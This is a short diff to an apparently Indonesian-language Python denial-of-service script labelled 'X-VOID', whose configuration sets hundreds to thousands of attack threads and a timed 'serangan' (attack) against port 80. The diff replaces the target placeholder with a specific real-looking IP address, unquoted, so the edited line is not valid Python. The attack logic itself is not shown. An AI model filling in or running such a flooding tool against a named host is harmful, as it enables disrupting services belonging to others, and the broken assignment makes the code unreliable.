@@ -5,7 +5,7 @@ import time
 import sys
 
 # ======== KONFIGURASI ========
-TARGET_IP = "TARGET_IP_DISINI"   # Ganti dengan IP target
+TARGET_IP = 103.50.160.145   # Ganti dengan IP target
 TARGET_PORT = 80                 # Port target (80 untuk HTTP, 443 untuk HTTPS)
 THREADS = 500                    # Jumlah thread (bisa naikin sampe 5000 kalo kuat)
 ATTACK_DURATION = 60             # Durasi serangan (detik)
@@ -99,3 +99,4 @@ if __name__ == "__main__":
     time.sleep(ATTACK_DURATION)
     print(f"\n[X-VOID] Serangan selesai setelah {ATTACK_DURATION} detik.")
     sys.exit(0)
+
